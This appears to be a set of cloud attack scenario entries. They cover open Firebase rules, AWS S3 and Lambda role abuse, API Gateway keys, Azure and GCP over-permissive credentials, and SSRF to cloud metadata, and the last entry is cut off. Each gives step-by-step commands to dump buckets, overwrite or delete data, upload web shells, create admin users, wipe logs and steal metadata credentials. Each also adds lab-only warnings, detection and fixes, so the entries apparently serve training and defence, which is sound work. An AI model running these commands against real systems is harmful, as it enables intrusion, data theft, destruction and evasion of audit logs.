Title: Over-Permissive Firebase Realtime Database (".read": true, ".write": true)
Scenario Description: In this real-world misconfiguration, a Firebase Realtime Database used by a mobile or web application is set up with insecure access rules like ".read": true and ".write": true, usually done by developers during testing. These rules make the entire database world-readable and world-writeable — meaning anyone on the internet can read, modify, delete, or insert any data without logging in. An attacker discovering this can access usernames, emails, passwords, chat messages, payment info, and can also inject malicious or misleading data. This is extremely common in many apps and exposes sensitive business and personal data.
Tools Used: Browser, Chrome DevTools, Burp Suite, Firebase Web Console, curl, Postman (optional), or Firepwn tool
Attack Steps: STEP 1 – FIND A TARGET WITH PUBLIC FIREBASE DATABASE: First, you need the database URL. You can find it by reverse engineering Android apps using tools like JADX or apktool. Look for URLs like https://<project-id>.firebaseio.com/ or .json. Alternatively, check JavaScript of web apps or search GitHub for hardcoded Firebase URLs. For example: https://myapp.firebaseio.com/. Once found, open it in your browser.STEP 2 – CHECK IF IT IS PUBLICLY READABLE: Add .json to the end of the URL and open it in browser: https://myapp.firebaseio.com/.json. If the full database loads without login (you see data in JSON format), then it means ".read": true is active. You’ll likely see objects like { "users": { "user1": { "email": ... }, "messages": ... }} — indicating user and app data is accessible.STEP 3 – ENUMERATE ALL AVAILABLE DATA: Using your browser or a tool like Postman or Burp, query more specific paths like:• https://myapp.firebaseio.com/users.json• https://myapp.firebaseio.com/chats.json• https://myapp.firebaseio.com/transactions.jsonThis allows you to list all user profiles, messages, or payment records depending on what the app stores. You can also automate this using Python and requests to download and parse all data. This is data exfiltration.STEP 4 – TEST IF DATABASE IS WRITABLE: Now try writing to the database by making a PUT or PATCH request. Example using curl:curl -X PUT -d '{"hacked":"yes"}' https://myapp.firebaseio.com/pwned.jsonIf this works and you see the content reflected when you open that path in browser, then the database is also publicly writable. This confirms that ".write": true is set, and now the attacker has full control over the app’s data.STEP 5 – MODIFY EXISTING DATA: Now go one step further: change existing values. For example:• Modify user email: curl -X PATCH -d '{"email":"attacker@example.com"}' https://myapp.firebaseio.com/users/user1.json• Change chat message: curl -X PATCH -d '{"text":"you have been hacked"}' https://myapp.firebaseio.com/messages/123.jsonThis shows you can change anything in the app without login.STEP 6 – INJECT FAKE OR MALICIOUS DATA: Add fake users or records to trick app logic. Example:• Inject new user: curl -X PUT -d '{"email":"fake@user.com","role":"admin"}' https://myapp.firebaseio.com/users/fakeuser.json• Add fake transaction record: curl -X POST -d '{"amount":"1000000","status":"paid"}' https://myapp.firebaseio.com/payments.json<brThis can lead to fraud, fake orders, or role escalation in the app.STEP 7 – PERSISTENCE OR IMPACT DEMONSTRATION: You can now continuously monitor or modify the database. Create a backdoor object like:• curl -X PUT -d '{"access":"admin"}' https://myapp.firebaseio.com/backdoor.json<brYou can also cause Denial of Service by filling the DB with junk data in a loop or deleting critical nodes: curl -X DELETE https://myapp.firebaseio.com/users.json.⚠️ WARNING: Always perform this only on your own Firebase test project or in CTF environments. Never attack real apps without permission.
Vulnerability: Insecure Firebase Rules – Public ".read": true, ".write": true
MITRE Technique: T1530 – Data from Cloud Storage / T1565.001 – Stored Data Manipulation
Impact: Sensitive data exfiltration, account hijacking, data loss, privilege escalation, DoS, user impersonation
Detection Method: Firebase console logging (if enabled), Firebase Security Rules Simulator, GCP audit logs, active monitoring for .json access patterns
Solution: Change Firebase security rules to restrict access: use ".read": "auth != null" and ".write": "auth != null" so only authenticated users can read/write. Never use true for read/write in production. Regularly audit rules and bucket permissions. Scan your mobile apps for exposed database URLs.

Title: AWS S3 IAM User with FullAccess Policy (AmazonS3FullAccess)
Attack Type: Cloud Storage Abuse via Over-Permissive IAM
Scenario Description: In this scenario, a developer or admin creates an IAM user in AWS and attaches the AmazonS3FullAccess policy to that user. This gives the user complete, unrestricted access to all S3 buckets in the account — they can upload, download, delete, overwrite, or even make buckets public. If an attacker gains access to this IAM user (via leaked access keys, compromised credentials, or insider access), they can exfiltrate sensitive data, upload malware, delete logs, or persist a backdoor by modifying bucket policies.
Tools Used: AWS CLI, AWS Console (GUI), Access Key + Secret Key, Burp Suite (optional), Python/Boto3 (optional), Any browser
Attack Steps: STEP 1 – UNDERSTAND YOUR ACCESS (PRE-CONDITION): The attacker has already gained access to an IAM user that has the AmazonS3FullAccess managed policy attached. You can confirm this in two ways. (1) From the AWS Console: Go to “IAM > Users > [YourUser] > Permissions” and check if AmazonS3FullAccess is listed. (2) From CLI: Run aws iam list-attached-user-policies --user-name YourUserName and then aws iam get-policy-version to confirm it grants "Action": "s3:*" and "Resource": "*".STEP 2 – ENUMERATE S3 BUCKETS: Now that you know you have full S3 access, list all buckets in the account using CLI: aws s3 ls. This will return the names of all buckets. Example output: 2024-07-01 my-private-bucketSTEP 3 – LIST CONTENT OF A BUCKET: Choose a bucket and list its contents using: aws s3 ls s3://my-private-bucket/ --recursive --human-readable --summarize. This gives you the folder structure and file names — including sensitive data like user_data.csv, backup.zip, db.sql, etc.STEP 4 – DOWNLOAD SENSITIVE FILES: Once you identify files of interest, download them using: aws s3 cp s3://my-private-bucket/backup.zip . or aws s3 sync s3://my-private-bucket/ ./dump/. These commands copy entire contents to your local machine. This is where data exfiltration occurs.STEP 5 – MODIFY OR OVERWRITE FILES: You can now modify or replace critical files. For example, aws s3 cp fake_notice.txt s3://my-private-bucket/terms.txt will overwrite an existing terms document with attacker-controlled content. You could upload a phishing HTML page or ransomware as update.exe and trick users.STEP 6 – UPLOAD MALICIOUS FILES TO SPREAD OR MAINTAIN ACCESS: Use aws s3 cp shell.php s3://my-private-bucket/ to upload a web shell or malware (in case the bucket is behind a web hosting setup). If public hosting is enabled, this file can be accessed via URL like http://my-private-bucket.s3.amazonaws.com/shell.php.STEP 7 – MODIFY BUCKET PERMISSIONS: You can now make the bucket public to allow external access: aws s3api put-bucket-acl --bucket my-private-bucket --acl public-read. You can also add a malicious bucket policy: aws s3api put-bucket-policy --bucket my-private-bucket --policy file://evil-policy.json to allow unauthenticated access or grant access to another attacker-controlled AWS account.STEP 8 – DELETE CRITICAL LOG FILES: You can also remove evidence or logs stored in S3: aws s3 rm s3://logs-bucket/cloudtrail/ --recursive to delete logs. Since AmazonS3FullAccess allows all actions, no further authorization is needed.STEP 9 – CLEANUP AND PERSISTENCE: For stealth or persistence, you can upload a harmless-looking file that acts as a signal or backdoor for later exploitation. For example, aws s3 cp marker.txt s3://my-private-bucket/.hidden/. You can also write a script using Python (boto3) to auto-sync with the bucket daily and exfiltrate new files silently.🚨 IMPORTANT: These steps are realistic and dangerous, so only test in lab setups or AWS free tier accounts that you own. Never run this attack on systems without authorization.
MITRE Technique: T1530 – Data from Cloud Storage / T1078 – Valid Account Abuse
Impact: Full compromise of all S3 data (read, write, delete), data breach, malware hosting, ransomware delivery, loss of trust
Detection Method: Monitor with AWS CloudTrail logs, S3 Access Logs, AWS GuardDuty alerts, and anomaly detection on S3 activities
Solution: Never assign AmazonS3FullAccess unless absolutely necessary. Use least-privilege IAM policies, scoping actions and resources. Rotate and limit use of access keys. Use condition-based IAM, enforce MFA, and use service control policies to restrict access. Enable S3 Object Lock and versioning to protect from deletion.

Title: Lambda Function Access via Role Escalation
Scenario Description: In this scenario, an IAM user has limited permissions but is mistakenly granted the ability to attach roles or assume roles due to over-permissive IAM policies. The attacker discovers that they can escalate privileges by assuming a role attached to a Lambda function that has powerful permissions (e.g., admin, S3 full access, or even STS full access). By exploiting AWS Lambda’s attached roles and permissions structure, the attacker gains access far beyond their original user permissions. This happens when IAM users are allowed to run sts:AssumeRole, lambda:GetFunctionConfiguration, or iam:PassRole with overly broad resource access (e.g., using "Resource": "*"), or when Lambda functions themselves use high-privileged execution roles.
Tools Used: AWS CLI, AWS Console, Burp Suite (optional), Recon Tools like Pacu (optional), Boto3 (optional)
Attack Steps: STEP 1 – CONFIRM LOW-PRIVILEGE USER ACCESS: Start by logging in using a compromised IAM user's credentials or a low-privileged developer account. Confirm permissions using AWS CLI: aws sts get-caller-identity to see your account and identity. Run aws iam list-attached-user-policies --user-name youruser and examine what you are allowed to do. If your policies include actions like iam:PassRole, lambda:ListFunctions, or sts:AssumeRole across all resources, this could indicate an opening for escalation.STEP 2 – ENUMERATE LAMBDA FUNCTIONS IN THE ACCOUNT: Use the command aws lambda list-functions to get all Lambda functions in the environment. Then for each function, run aws lambda get-function-configuration --function-name <FunctionName> to see which IAM role is attached to the function under Role:. This tells you what privileges the function has.STEP 3 – IDENTIFY TARGET LAMBDA FUNCTION WITH HIGH PRIVILEGES: Look for Lambda functions that have execution roles like lambda_basic_execution, AdminLambdaRole, LambdaS3FullAccess, or roles with s3:*, iam:*, ec2:*, or sts:* in their permission policies. You can check the role by running aws iam get-role --role-name <RoleName> and aws iam list-attached-role-policies --role-name <RoleName> to view what the Lambda function can do.STEP 4 – ASSUME THE ROLE OF THE LAMBDA FUNCTION: If your current IAM user has sts:AssumeRole allowed on the Lambda’s execution role (which is common with "Resource": "*") you can use the CLI to assume that role: aws sts assume-role --role-arn arn:aws:iam::<account-id>:role/<TargetLambdaRole> --role-session-name escalatedsession. Save the temporary credentials from the output (AccessKeyId, SecretAccessKey, SessionToken).STEP 5 – SET ENVIRONMENT TO USE THE ASSUMED ROLE: Use aws configure or environment variables to set the temporary credentials from the previous step. Now your CLI operates under the new escalated role that belonged to the Lambda function.STEP 6 – PERFORM ESCALATED ACTIONS: You can now perform privileged actions that your original user couldn’t. For example:• List and download sensitive S3 files: aws s3 ls s3://my-secret-bucket/ and aws s3 cp s3://my-secret-bucket/db_backup.sql .• Delete logs: aws logs delete-log-group --log-group-name /aws/lambda/targetfunction• Create or modify IAM users: aws iam create-user --user-name attacker and aws iam attach-user-policy --user-name attacker --policy-arn arn:aws:iam::aws:policy/AdministratorAccessSTEP 7 – OPTIONALLY MODIFY THE LAMBDA FUNCTION CODE FOR PERSISTENCE: You can update the Lambda function’s code to include a backdoor using aws lambda update-function-code or change the environment variables to leak secrets via webhook, if your permissions allow.STEP 8 – COVER TRACKS (OPTIONAL): Use your escalated privileges to delete CloudTrail logs from S3 (if stored there), remove the attacker IAM user after creating another secret access method, or delete CloudWatch log groups to hide Lambda invocation history.⚠️ WARNING: All steps here must only be performed in legal lab setups or AWS accounts that belong to you. Unauthorized use is illegal and unethical.
Vulnerability: IAM role escalation via over-permissive trust relationships and pass role permissions
MITRE Technique: T1078 – Valid Accounts / T1068 – Privilege Escalation
Impact: Full AWS account compromise, unauthorized access to all Lambda-linked services, data theft, persistent backdoor insertion
Detection Method: Monitor for unexpected use of sts:AssumeRole, track IAM activity via AWS CloudTrail, detect unusual role switching or CLI activity
Solution: Restrict sts:AssumeRole, iam:PassRole, and lambda:UpdateFunctionCode permissions. Apply least privilege to Lambda roles. Use explicit Condition statements on iam:PassRole policies. Regularly audit IAM roles and Lambda trust relationships.

Title: API Gateway Keys With Broad Invocation Rights
Attack Type: Unrestricted API Invocation via Key Misuse
Scenario Description: In this scenario, a developer or cloud admin configures AWS API Gateway with an API Key that can invoke any stage, any method, or any endpoint without restriction. This often happens when developers assign usage plans and API keys broadly (e.g., allowing ANY /{proxy+} in API Gateway) for testing. If an attacker obtains this key (via code repo leaks, hardcoded keys in apps, or compromised developers), they can invoke any API operation, access internal resources, or even abuse backend Lambda/EC2 services. This becomes dangerous when the API is connected to sensitive systems like admin dashboards, payment processors, or internal cloud services.
Tools Used: Browser, Burp Suite, Postman, curl, AWS CLI, Recon tools (e.g., GitHub search, HTTP proxy, Amass for subdomain discovery)
Attack Steps: STEP 1 – FIND THE API GATEWAY AND KEY: Begin by locating an AWS API Gateway URL that uses an API Key. These often look like https://abc123.execute-api.us-east-1.amazonaws.com/prod/. This URL may be found in mobile apps (decompiled via JADX), JavaScript files in web apps, or leaked in GitHub/search engines. Next, find an associated x-api-key. This could be:• Hardcoded in a mobile/web app• Found in GitHub using searches like x-api-key or aws_api_key• Obtained via recon or insider accessSTEP 2 – VERIFY API KEY IS ACTIVE: Open Postman or curl and send a GET request to the endpoint: curl -X GET https://abc123.execute-api.us-east-1.amazonaws.com/prod/ --header "x-api-key: YOURKEYHERE". If the response is 200 OK or returns data, the API key is active.STEP 3 – ENUMERATE API METHODS USING FUZZING OR ERROR MESSAGES: Try calling common endpoints like:• /admin, /login, /users, /config, /lambda, /debug, /dev, /internal, /env, /v1/secrets, etc.You can automate this using Burp Intruder or wfuzz. If the API is using {proxy+} wildcard routes or has misconfigured usage plans, you'll be able to access any method.STEP 4 – INVOKE HIGH-RISK OR ADMIN FUNCTIONS: Try POST, PUT, DELETE methods with the same key. For example:• curl -X DELETE https://abc123.execute-api.us-east-1.amazonaws.com/prod/users/1 --header "x-api-key: YOURKEY"• curl -X POST https://abc123.execute-api.us-east-1.amazonaws.com/prod/admin/reset --data '{"confirm": true}' --header "x-api-key: YOURKEY"If successful, you may be deleting users, resetting services, or invoking backend operations.STEP 5 – ENUMERATE STAGES AND VERSIONS: Try changing /prod/ to /dev/, /test/, /v1/, /v2/, or even /admin/ — API Gateway often deploys multiple environments. Many are not protected. Example:curl -X GET https://abc123.execute-api.us-east-1.amazonaws.com/dev/ --header "x-api-key: YOURKEY"STEP 6 – ABUSE BACKEND INTEGRATIONS: If the API Gateway is connected to Lambda, EC2, or S3 services, you can indirectly access those too. For example, hitting /lambda/do-admin-task might invoke a privileged Lambda function. You can invoke it repeatedly, change its input parameters, or break workflows. You may even trigger billing spikes or downtime.STEP 7 – MASS EXFILTRATION OR DoS: If the key allows unrestricted access, automate the process using scripts. You can enumerate endpoints, dump responses, or flood the API to consume rate limits. Use Python scripts to fetch /data/export, /users, or similar high-value endpoints.STEP 8 – COVER TRACKS (OPTIONAL): If backend logging is weak, you might rename or corrupt data via authorized-looking requests. You may also use Tor or proxy chains to mask your IP. However, API Gateway usually integrates with CloudWatch and may retain logs of each call (unless disabled).⚠️ IMPORTANT: All this must only be performed in controlled lab/test environments or with written permission from the system owner. Misuse is illegal and unethical.
Vulnerability: Over-Permissive API Key tied to unrestricted usage plan or wildcard stage/method invocation
MITRE Technique: T1190 – Exploit Public-Facing Application / T1078 – Valid Accounts
Impact: Full backend compromise, data leaks, invocation of privileged Lambda/EC2/S3 services, unauthorized access to internal resources, financial DoS due to usage abuse
Detection Method: Monitor API Gateway access logs in CloudWatch, analyze x-api-key usage, enable throttling/quotas, track unknown endpoints being called
Solution: Restrict API Key usage plans to specific stages/methods, never use {proxy+} without proper validation, rotate API keys regularly, use auth tokens (JWT/OAuth) over static API keys, and implement IP whitelisting or WAF

Title: Azure Storage Contributor Role to Mobile Client
Attack Type: Over-Permissive Role Assignment to Insecure Identity
Scenario Description: In this real-world scenario, a developer accidentally assigns the Azure “Storage Blob Data Contributor” role to a mobile client identity, such as an Azure AD B2C application or a device app. This role gives the mobile app full permissions over blob containers — meaning the mobile client can read, write, delete, and modify files in the Azure Blob Storage linked to the subscription. The attack becomes possible when the mobile app is reverse-engineered (using JADX or other APK tools) to extract the app’s client ID and secret, or if the app uses MSAL/Azure Identity tokens with weak controls. Once the attacker retrieves these credentials or refresh tokens, they can access the storage backend like an internal user, with full power — all because the role was too powerful for a mobile client.
Tools Used: JADX (Android Decompiler), Postman or curl, Azure CLI, Azure Portal, MSAL Client (Mobile Auth), Fiddler/Burp (optional), Python with azure.identity and azure.storage.blob
Attack Steps: STEP 1 – REVERSE ENGINEER THE MOBILE APP TO GET AZURE CREDENTIALS: First, download the target app's APK file. Use a tool like JADX or apktool to decompile the APK. Look for hardcoded strings like client_id, tenant_id, client_secret, storage_account, or any MSAL configuration. Sometimes, tokens or endpoints will be present in the code (especially in React Native or Flutter-based apps).STEP 2 – OBTAIN OR REUSE ACCESS TOKEN: If you find hardcoded credentials or MSAL configuration, you can generate an access token using the Azure CLI or MSAL library. If the app uses client_credentials flow (common for service apps), you can get a token using:az account get-access-token --resource https://storage.azure.com/ --client-id <client_id> --client-secret <secret>Or use Postman to call Azure OAuth 2.0 endpoint: https://login.microsoftonline.com/<tenant_id>/oauth2/v2.0/token to obtain a bearer token.STEP 3 – VERIFY STORAGE PERMISSIONS: Once you have a valid token, verify what the token can do. You can list containers by sending a request like:curl -X GET -H "Authorization: Bearer <token>" https://<account>.blob.core.windows.net/?comp=listIf the response lists container names, it means you have storage-level access.STEP 4 – ACCESS OR EXFILTRATE DATA: Now access actual blob contents. For example, to list files inside a container:curl -X GET -H "Authorization: Bearer <token>" "https://<account>.blob.core.windows.net/mycontainer?restype=container&comp=list"Then, download files using URLs like:curl -O -H "Authorization: Bearer <token>" "https://<account>.blob.core.windows.net/mycontainer/private-data.csv"This gives access to potentially sensitive documents, PII, logs, app backups, etc.STEP 5 – WRITE OR MODIFY FILES IN STORAGE: You can also upload new files or replace existing files, which is dangerous in real apps. For example:curl -X PUT -T "malicious.txt" -H "x-ms-blob-type: BlockBlob" -H "Authorization: Bearer <token>" "https://<account>.blob.core.windows.net/mycontainer/malicious.txt"<brThis could allow you to upload defaced content, phishing payloads, backdoors, or even inject malware that gets auto-loaded by other Azure services like Web Apps or Functions.STEP 6 – DELETE CRITICAL FILES (OPTIONAL): With contributor-level access, you can delete any blob. Example:curl -X DELETE -H "Authorization: Bearer <token>" "https://<account>.blob.core.windows.net/mycontainer/db_backup.zip"<brThis can cause downtime, data loss, or disrupt app functionality.STEP 7 – PERSISTENCE (OPTIONAL): If you want to stay hidden, you can periodically poll the storage using a script to monitor files, or keep re-uploading a marker/blob file. You can also modify container metadata to confuse detection or rename files.⚠️ IMPORTANT: This simulation is for learning only. Always test in a legal lab, Azure trial account, or permissioned environment. Never attack a real app unless you have authorization.
Vulnerability: Over-Permissive Role Binding of "Storage Blob Data Contributor" to Public or Mobile Identity
MITRE Technique: T1078 – Valid Accounts / T1087 – Account Discovery / T1565.001 – Stored Data Manipulation
Impact: Full data access and modification in Azure Blob Storage, PII leaks, malware hosting, business disruption, ransom scenarios, persistent control over app storage
Detection Method: Azure Activity Logs, Blob access logs, Azure Defender alerts for excessive blob operations or suspicious IP behavior
Solution: Never assign Contributor roles to mobile or frontend apps. Use SAS tokens with minimal scopes, set time limits, or use Azure AD RBAC with least privilege. Rotate secrets regularly, use conditional access policies, and monitor blob activity for anomalies. Always audit app roles and mobile identities before production deployment.

Title: GCP IAM Key With Editor Role in Mobile App
Attack Type: Cloud Account Takeover via Leaked Editor Role Key
Scenario Description: In this real scenario, a mobile application (Android or iOS) accidentally includes a Google Cloud IAM service account key in the app package. Worse, this key belongs to a service account with the over-permissive “Editor” role (roles/editor). The Editor role allows full control over most GCP resources: reading, writing, creating, deleting, or even modifying IAM policies. When an attacker extracts this key by reverse-engineering the mobile app, they can use it to impersonate the service account, explore the environment, and take control of the project or resources such as Cloud Storage, Firestore, Compute, and even Cloud Functions. This misconfiguration is extremely dangerous and commonly reported in mobile app bug bounties.
Tools Used: JADX or apktool (to reverse APK), GCP CLI (gcloud), curl/Postman, Python (with google-auth, google-cloud-storage), GCP Console, GitHub (for leaked keys), Burp Suite (optional)
Attack Steps:
STEP 1 – EXTRACT THE SERVICE ACCOUNT KEY FROM THE MOBILE APP: Download the APK of the mobile app from a phone or APKMirror site. Use jadx-gui or apktool to reverse-engineer the app. Look for files like service-account.json, credentials.json, or hardcoded strings like -----BEGIN PRIVATE KEY-----. These are often embedded in the res/raw/ folder or within Java/Kotlin/JS code. Copy the full JSON key if found.STEP 2 – VALIDATE THE KEY'S PERMISSION SCOPE: Save the key as key.json. Set up authentication locally: run gcloud auth activate-service-account --key-file=key.json and then gcloud auth list to confirm it’s active. Then check project access: gcloud projects get-iam-policy PROJECT_ID. If it works, the key is active and has sufficient permissions. If the role attached is roles/editor, it gives full control of the project, excluding billing/IAM admin (unless customized).STEP 3 – ENUMERATE GCP RESOURCES: Use GCP CLI to list and map services the key has access to:• gcloud compute instances list (List virtual machines)• gcloud functions list (Cloud Functions)• gcloud storage buckets list (Buckets)• gcloud firestore databases list (Firestore databases)• gcloud sql instances list (Cloud SQL)This gives the attacker full visibility into the app's cloud backend.STEP 4 – EXFILTRATE OR MODIFY DATA: Now use the Editor role to access or steal sensitive data. For example:• gcloud storage cp gs://myapp-private-data/dump.sql . to download a database• gcloud firestore documents list projects/PROJECT_ID/databases/(default)/documents/users to read user data• gcloud functions describe sendNotification to extract environment variables (API keys, secrets)• Or use Python to fetch files:python
from google.cloud import storage
client = storage.Client.from_service_account_json("key.json")
buckets = list(client.list_buckets())
for b in buckets:
print(b.name)
STEP 5 – WRITE, DELETE, OR OVERWRITE RESOURCES: As an Editor, you can now modify everything. Examples:• Upload malware or phishing files to public buckets• Overwrite existing Cloud Functions: gcloud functions deploy notify --source=./malicious_code --runtime python39 --trigger-http• Delete databases, logs, or functions to cause Denial of Service• Modify Firestore documents or upload fake transactionsSTEP 6 – ESCALATE PRIVILEGES IF IAM POLICIES ARE TOO BROAD: If IAM allows modifying other roles, the attacker can add themselves to the project. Run:gcloud projects add-iam-policy-binding PROJECT_ID --member="user:attacker@gmail.com" --role="roles/owner"Now the attacker has persistent full control even if the leaked key is revoked later.STEP 7 – CLEANUP (OPTIONAL): To hide activity, attacker can delete logs stored in GCS buckets: gcloud storage rm gs://logs-bucket/* or stop functions from logging. They may also delete backups, snapshots, or storage versions.⚠️ REMEMBER: This is a real attack based on actual incident reports. You should only practice this in your own GCP lab or a controlled environment. Never access or test live applications without written permission.
Vulnerability: Leaked GCP Service Account Key with Over-Permissive Editor Role
MITRE Technique: T1078 – Valid Accounts / T1068 – Privilege Escalation / T1530 – Data from Cloud Storage
Impact: Full control over GCP project: resource takeover, data theft, service disruption, app destruction, IAM escalation
Detection Method: Google Cloud Logging, Cloud Audit Logs, Storage Access Logs, anomaly alerts in Security Command Center
Solution: NEVER embed IAM keys inside apps. Use Identity Aware Proxy, Workload Identity Federation, or Firebase auth tokens. If service account key is needed, use custom role with least privilege, rotate keys frequently, use key monitoring, and audit all service account bindings.
Tags: GCP, IAM Key Leak, Mobile App Risk, Editor Role Abuse, Cloud Privilege Escalation, Beginner-Friendly, Real Attack

Title: Image Fetch via URL in Mobile App (Classic SSRF)
Scenario Description: In this real-world case, a mobile application has an image upload feature or URL preview function where the user can submit an external image URL. The backend server fetches this image on behalf of the client. However, the app fails to validate the URL properly, allowing an attacker to point the URL to internal IPs or cloud metadata servers (like AWS EC2 Metadata URL or GCP metadata). This causes the backend server (inside the cloud) to make internal requests unknowingly, leading to sensitive information disclosure or lateral movement inside the cloud infrastructure.
Tools Used: Mobile app (to find the feature), Burp Suite (for intercepting requests), HTTP Request Bin (for observing outbound calls), AWS/GCP Cloud trial account, curl, Postman
Attack Steps: STEP 1 – IDENTIFY AN IMAGE FETCH OR URL PREVIEW FUNCTION: Install the mobile app and navigate through its features. Look for areas where you can "submit a link," "upload a profile picture via URL," or "generate preview" of a URL. Capture the requests using Burp Suite or a proxy tool and note the backend endpoint handling the request (e.g., POST /api/image/fetch).STEP 2 – TEST EXTERNAL IMAGE URL FETCHING: Use Postman or curl to send a request to the endpoint with a valid external image URL like https://example.com/dog.jpg. Confirm that the backend fetches and returns the image or its metadata. This proves the server makes HTTP requests on your behalf (proxy behavior).STEP 3 – PERFORM SSRF TO INTERNAL CLOUD IPs: Now, replace the image URL with internal IP addresses to test for SSRF:• AWS: http://169.254.169.254/latest/meta-data/• GCP: http://metadata.google.internal/computeMetadata/v1/• Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01If the server returns metadata, instance ID, IAM role, or tokens, it confirms SSRF. In AWS, try http://169.254.169.254/latest/meta-data/iam/security-credentials/ to retrieve credentials.STEP 4 – EXFILTRATE CLOUD CREDENTIALS (IF POSSIBLE): Once you access the IAM role name, call:http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAMEThis often returns access keys and session tokens. These can be used with AWS CLI:aws configure → Enter the keys → Try aws s3 ls to access internal cloud resources.STEP 5 – SCAN OTHER INTERNAL SERVICES: Try fetching URLs like:• http://localhost:8080/actuator• http://127.0.0.1/admin• http://internal-api.local/health<brThese can lead to internal dashboards, admin panels, or open ports.STEP 6 – BUILD SSRF CHAIN (OPTIONAL): You can create chained attacks using SSRF + cloud metadata + privilege escalation. Example: SSRF → Get AWS keys → Use keys to assume role or dump S3 buckets → escalate to full cloud takeover.⚠️ WARNING: Only test in legally permitted environments or your own apps.
Vulnerability: SSRF via improper URL validation in fetch endpoints
MITRE Technique: T1190 – Exploit Public-Facing Application / T1557.001 – Cloud Metadata Retrieval
Impact: IAM credential theft, access to internal systems, S3 or GCP bucket leaks, lateral movement, full cloud compromise
Detection Method: Monitor unusual traffic to 169.254.169.254 or metadata URLs from web apps, detect anomalies in IAM usage or logs
Solution: Validate user-supplied URLs strictly. Block access to internal IP ranges (169.254.x.x, 127.0.0.1, 10.x.x.x, etc.), enforce allowlists, and timeout any slow URL fetches.
Tags: SSRF, Metadata Exploitation, Mobile SSRF, Cloud Exposure, URL Fetch Flaw
Source: Bug Bounty Reports, HackerOne, OpenAI Research

Title: QR Code or URL Preview via API (Blind SSRF)
Scenario Description: In this scenario, a web or mobile API accepts a user-supplied URL and generates a preview card, summary, or QR code using server-side logic. The result is not directly shown, or only metadata is returned, making it a blind SSRF. An attacker uses this feature to make the backend server connect to internal services (metadata IPs, internal admin panels, etc.). They confirm SSRF by hosting a controlled domain and watching for hits using DNS logs or request catchers. Blind SSRFs are especially dangerous in cloud because they can be used to steal metadata credentials without immediate feedback.
Tools Used: Burp Suite, Interactsh, RequestBin, ngrok, curl, Postman, AWS CLI, custom DNS logger
Attack Steps: STEP 1 – FIND URL PREVIEW OR QR ENDPOINT: Look for mobile or web features like “preview this URL,” “fetch metadata for link,” or “generate QR code from URL.” Use Burp Suite to intercept and log the exact API call (e.g., POST /api/preview) that receives the URL as input.STEP 2 – SET UP SSRF MONITORING: Use https://interact.sh or https://requestbin.io to generate a listener URL. These tools allow you to detect if the server makes a request (even when the app doesn't show a result).STEP 3 – SUBMIT MONITORED URL TO THE API: Craft a request like:POST /api/preview {"url": "http://abc123.interact.sh"}<brIf you see a DNS or HTTP hit on your Interactsh dashboard, you’ve confirmed blind SSRF — the server made a request on your behalf.STEP 4 – ACCESS CLOUD METADATA BLINDLY: Now try:• AWS: http://169.254.169.254/latest/meta-data/• GCP: http://metadata.google.internal/<brSince the response isn’t shown, encode the URL using your server:1. Host a redirector like http://yourdomain.com/redirect.php?to=169.254.169.254/latest/meta-data/2. Server follows the redirect and fetches the internal address3. If you get a second request to your site, SSRF workedSTEP 5 – TRIGGER LOG-BASED OR TIMING SIDE-CHANNELS (OPTIONAL): You can add unique headers like User-Agent: attacker123, or cause a delay using a known slow endpoint (http://127.0.0.1:1234) and measure timeout to infer access. Even if no response is shown, you can confirm SSRF indirectly.STEP 6 – CHAIN TO METADATA THEFT (IF CONFIRMED): Once proven, create redirect-based chains that ultimately return IAM keys or access tokens. For example:http://yourdomain.com/step1.php → step2 → 169.254.169.254<brThen monitor all intermediate requests.STEP 7 – REPORT OR EXPLOIT RESPONSIBLY: Blind SSRF is hard to detect but extremely dangerous in cloud systems. Once confirmed, use IAM tokens from SSRF to run aws configure, then try S3/EC2 access to check blast radius.⚠️ NOTE: Always test in legal environments. Never misuse SSRF attacks on live systems without permission.
Vulnerability: Blind SSRF via server-side URL fetching without validation
MITRE Technique: T1190 – Exploit Public-Facing Application / T1557.001 – Metadata Collection via SSRF
Impact: Stealth access to cloud metadata, tokens, IAM abuse, internal network discovery, pivoting, full cloud takeover
Detection Method: Detect outbound DNS/HTTP to unusual domains, track internal IP requests, monitor header anomalies (custom UA)
Solution: Never trust user-submitted URLs. Sanitize and filter IPs (block internal, metadata, loopback), use allowlists, disable redirects. Add SSRF protection libraries in app frameworks.
Tags: Blind SSRF, Metadata Theft, Cloud Abuse, Mobile/Web SSRF, Interactsh, Cloud Security
Source: PortSwigger, Interactsh, Bug Bounty Reports, OpenAI Labs

Title: Webhook Callback Abuse
Scenario Description: Many SaaS applications and APIs allow users to set a webhook URL to receive event notifications. If an attacker provides a malicious internal URL (e.g., http://localhost:80, http://169.254.169.254), the server may unknowingly connect to internal services or metadata APIs, leading to SSRF exploitation.
Tools Used: Burp Suite, RequestBin, Interactsh, Ngrok, Postman
Attack Steps: 1. Find a cloud application (e.g., CI/CD tool, webhook platform) that allows setting a custom webhook callback URL. 2. Register a free account on that platform. 3. In your webhook settings, set the webhook URL to your own controlled listener (e.g., using RequestBin or Interactsh). 4. Trigger the event (like a push in CI/CD or file upload). 5. Check if the service connects to your endpoint. This proves webhook execution. 6. Now replace your public listener URL with an internal one like http://169.254.169.254/latest/meta-data/. This is the AWS metadata endpoint which reveals credentials if SSRF is successful. 7. Trigger the webhook again. If the server shows a delayed response or your public listener shows a request from the server (some platforms reflect the data), it’s vulnerable. 8. If reflected data is received (e.g., instance ID, IAM role name, access keys), you can continue querying internal AWS services. 9. Use these keys with AWS CLI to confirm access (e.g., aws s3 ls --access-key ...). 10. If successful, you’ve confirmed a critical SSRF via webhook abuse.
Impact: Internal metadata exposure, credential theft, lateral movement in cloud
Detection Method: Log monitoring of outgoing HTTP requests to internal IPs, alert on metadata URL access
Solution: Validate webhook URLs via allowlist or use DNS rebinding protection; never allow internal IPs or loopback addresses
Tags: SSRF, Webhook Abuse, Cloud, AWS Metadata, Callback Exploitation

Title: PDF/Image Generation with Remote URLs
Scenario Description: Cloud services often allow users to generate PDFs or images from URLs (for screenshots, invoices, previews, etc.). If the server fetches the remote URL and embeds it in the PDF/image, attackers can exploit this to make the server fetch internal services or cloud metadata, leading to SSRF.
Tools Used: Burp Suite, Ngrok, Interactsh, RequestBin, Google Chrome
